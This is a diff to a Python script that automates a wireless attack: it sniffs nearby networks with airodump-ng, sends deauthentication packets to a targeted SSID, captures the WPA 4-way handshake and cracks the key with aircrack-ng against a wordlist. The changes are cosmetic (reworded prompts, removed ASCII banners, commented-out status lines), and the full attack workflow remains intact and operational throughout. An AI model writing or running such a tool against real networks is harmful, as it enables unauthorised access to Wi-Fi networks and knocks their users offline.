@@ -8,7 +8,7 @@ from time import sleep
 number_deauth_packets = 20
 
 if os.geteuid() != 0:
-    print("\nHey noob, you need to run this script as root. #thx\n")
+    print("\nThis script must be run as root\n")
     exit(0)
 
 def network_setup(int_name):
@@ -21,7 +21,7 @@ def network_setup(int_name):
         int_name = str(os.popen(cmd).read()).strip('\n')
         return int_name
     except KeyboardInterrupt:
-        print ("network_setup failed, please run script again")
+        print ("The network setup failed, run the script again")
 
 def network_teardown(int_name):
     try:
@@ -34,11 +34,11 @@ def network_sniff(interface_name):
     try:
         os.system("airodump-ng -a -w testcap %s" %interface_name)
     except KeyboardInterrupt:
-        print ("Network Sniffing Ended")
+        print ("Network sniffing done")
 
 def deauth_bomb(int_name, number_deauth_packets):
     try:
-        ssid_name = str(raw_input("What are the first 3 letters of the ssid you want to target? (Case Sensitive) "))
+        ssid_name = str(raw_input("Input the first 3 characters of the ssid you are targetting (Case Sensitive): "))
 
         cmd = "cat testcap-01.csv | grep " + ssid_name + " | awk '{print $1}' | awk -F',' 'NR==1{print $1}'"
         bssid = str(os.popen(cmd).read()).strip('\n')
@@ -62,37 +62,27 @@ def capture_handshake(bssid, int_name, channel):
     except KeyboardInterrupt:
         print ("nothing")
 
-
-def display_ascii_bomb():
-	print("\n                 _.-^^---....,,--\n             _--                  --_\n            <                        >)\n            |                         |\n             \._                   _./\n                ```--. . , ; .--'''\n                      | |   |\n                   .-=||  | |=-.\n                   `-=#$%&%$#=-'\n                      | ;  :|\n             _____.,-#%&$@%#&#~,._____\n\n")
-
-def display_ascii_logo():
-    print("                      (                                         \n (  (                 )\ )            (                      )  \n )\))(   ' (         (()/(   (      ( )\            )     ( /(  \n((_)()\ )  )\   ___   /(_))  )\     )((_)   (      (      )\()) \n_(())\_)()((_) |___| (_))_| ((_)   ((_)_    )\     )\  ' ((_)\  \n\ \((_)/ / (_)       | |_    (_)    | _ )  ((_)  _((_))  | |(_) \n \ \/\/ /  | |       | __|   | |    | _ \ / _ \ | '  \() | '_ \ \n  \_/\_/   |_|       |_|     |_|    |___/ \___/ |_|_|_|  |_.__/ \n")
-
-
 if __name__ == "__main__":
 
     os.system("rm testcap*")
     os.system("rm captured*")
-    display_ascii_logo()
-    display_ascii_bomb()
     os.system("iwconfig")
 
-    interface_name = raw_input("What is the name of your wireless interface? ")
+    interface_name = raw_input("Input the name of your wireless interface: ")
 
-    print ("\nSetting up Nic Parameters")
+    #print ("\nSetting up Nic Parameters")
     int_name = network_setup(interface_name)
 
-    print ("\nsniffing network, press CTRL+C when you see a network you want to target")
+    #print ("\nsniffing network, press CTRL+C when you see a network you want to target")
     network_sniff(int_name)
 
-    print ("\nWith user input, sending De-Auth bomb")
+    #print ("\nWith user input, sending De-Auth bomb")
     bssid, channel = deauth_bomb(int_name, number_deauth_packets)
 
-    print ("Capturing 4-way handshake, targeting " + str(bssid))
+    #print ("Capturing 4-way handshake, targeting " + str(bssid))
     capture_handshake(bssid, int_name, channel)
 
-    print("\nResetting Nic Parameters and restarting Network-Manager.\n")
+    #print("\nResetting Nic Parameters and restarting Network-Manager.\n")
     network_teardown(int_name)
 
     cmd = "aircrack-ng -w /usr/share/john/password.lst -b " + bssid + " captured_packet-01.cap"
